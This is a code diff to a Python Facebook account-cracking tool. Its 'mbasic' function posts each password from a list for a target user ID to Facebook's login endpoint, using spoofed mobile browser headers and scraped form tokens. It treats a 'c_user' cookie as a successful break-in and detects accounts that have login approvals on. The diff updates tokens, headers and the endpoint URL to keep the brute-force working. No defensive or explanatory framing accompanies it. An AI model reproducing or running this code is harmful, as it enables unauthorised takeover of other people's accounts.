@@ -1254,9 +1254,6 @@ def mbasic(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
-            ua = random.choice(uas)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
@@ -1265,44 +1262,50 @@ def mbasic(uid,pwx,tl):
             'try_number': '0',
             'unrecognized_tries': '0',
             'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'contact_point',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
             'had_password_prefilled': 'false',
             'is_smart_lock': 'false',
             'bi_xrwh': '0',
             'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'fb_dtsg': 'NAcNW7dnKAb_WUqhir8ZBk8LUcBFsiIuSHq2OKV8gUs2Ofl2jNxTnQw:0:0',
+            'fb_dtsg': 'NAcMW16pR36FHEBLUiVeq9HiYD3qCfQpzHyAanSow3zNsKmw42MbuVw:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wGwcq0RE1u86i0h-0zE1bE881eEdEG0hi0Lo6-0Co178dE1UU3jw',
+            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1EE2Cwro0wa4o1MUaE36wdq0ny1Aw4vw8W0k-0jG3qaw4kwbS1Lw9C0hO3q0ue0QU',
             'csr': '',
             'req': '2',
             'fmt': '1',
-            'a': 'AYlZYUDiZqtfVxy_hd3jd217cyf2OexqVPFlTnUxynLWBo_wjxuJYFLWrUtycfiSD0Z65CyKW4F3k-tk1mj_6diK9rYLliY-s2Y5TR-47hJBog',
+            'a': 'AYmLxBiC_N7y8n0y8AtrTE86S7m2gL7JoPQxQm-p5te-kg0PL8eAYTJS8lGHljqauZS4ZqVQXbDfWQAoLX78TV6VOPlUFPnv_UUODg4UpimrYg',
             'user': '0'}
-            headers = {'authority':'mbasic.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
+            headers = {
+            'authority': 'm.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=221901731857165&kid_directed_site=0&app_id=221901731857165&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccount.businessinsider.com%252Fv2.0%252Fauth%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVzT24iOiIyMDI1LTAxLTA5VDIwOjQyOjEyLjAxOVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tLyIsInNvdXJjZSI6ImFjY291bnRfY3JlYXRpb25fc3RhbmRhcmRfYXV0aCIsImFydGljbGVVcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tLyIsImFiVGVzdHMiOnsicG1wIjoidmEiLCJjYXBpdjItMTAwLTAiOiJjIn0sImlhdCI6MTczNjQ0ODEzMiwianRpIjoiYzJhOTk0N2YtN2MyOS00YWVjLWJmZWEtMjM5MzRhOWFjMjhhIn0.jQjsqgZc2m2EOTmGeybWnutZ-n-ltRHlT8LcwutmymE%26client_id%3D221901731857165%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D38d0d67a-02d8-4bc6-b9d7-577cee313d39%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.businessinsider.com%2Fv2.0%2Fauth%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVzT24iOiIyMDI1LTAxLTA5VDIwOjQyOjEyLjAxOVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tLyIsInNvdXJjZSI6ImFjY291bnRfY3JlYXRpb25fc3RhbmRhcmRfYXV0aCIsImFydGljbGVVcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tLyIsImFiVGVzdHMiOnsicG1wIjoidmEiLCJjYXBpdjItMTAwLTAiOiJjIn0sImlhdCI6MTczNjQ0ODEzMiwianRpIjoiYzJhOTk0N2YtN2MyOS00YWVjLWJmZWEtMjM5MzROWFjMjhhIn0.jQjsqgZc2m2EOTmGeybWnutZ-n-ltRHlT8LcwutmymE%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            'sec-ch-ua-model': '"22041216I"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"14.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': 'AVqUDyL4Ang',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/"
+            url = "https://m.facebook.com/login/device-based/login/async/?api_key=221901731857165&auth_token=c31ee10e8b1643b3594a9b52ea812436&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccount.businessinsider.com%252Fv2.0%252Fauth%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVzT24iOiIyMDI1LTAxLTA5VDIwOjQyOjEyLjAxOVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tLyIsInNvdXJjZSI6ImFjY291bnRfY3JlYXRpb25fc3RhbmRhcmRfYXV0aCIsImFydGljbGVVcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tLyIsImFiVGVzdHMiOnsicG1wIjoidmEiLCJjYXBpdjItMTAwLTAiOiJjIn0sImlhdCI6MTczNjQ0ODEzMiwianRpIjoiYzJhOTk0N2YtN2MyOS00YWVjLWJmZWEtMjM5MzRhOWFjMjhhIn0.jQjsqgZc2m2EOTmGeybWnutZ-n-ltRHlT8LcwutmymE%26client_id%3D221901731857165%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D38d0d67a-02d8-4bc6-b9d7-577cee313d39%26tp%3Dunspecified&refsrc=deprecated&app_id=221901731857165&cancel=https%3A%2F%2Faccount.businessinsider.com%2Fv2.0%2Fauth%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVzT24iOiIyMDI1LTAxLTA5VDIwOjQyOjEyLjAxOVoiLCJjb25uZWN0aW9uTmFtZSI6ImZhY2Vib29rIiwiY2xpZW50SWQiOiJmYWY1YTkxMC00NmMxLTQ3ZmQtYTE5YS0zMjA3MWE0MTU0N2IiLCJyZXR1cm5VcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tLyIsInNvdXJjZSI6ImFjY291bnRfY3JlYXRpb25fc3RhbmRhcmRfYXV0aCIsImFydGljbGVVcmwiOiJodHRwczovL3d3dy5idXNpbmVzc2luc2lkZXIuY29tLyIsImFiVGVzdHMiOnsicG1wIjoidmEiLCJjYXBpdjItMTAwLTAiOiJjIn0sImlhdCI6MTczNjQ0ODEzMiwianRpIjoiYzJhOTk0N2YtN2MyOS00YWVjLWJmZWEtMjM5MzRhOWFjMjhhIn0.jQjsqgZc2m2EOTmGeybWnutZ-n-ltRHlT8LcwutmymE%23_%3D_&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
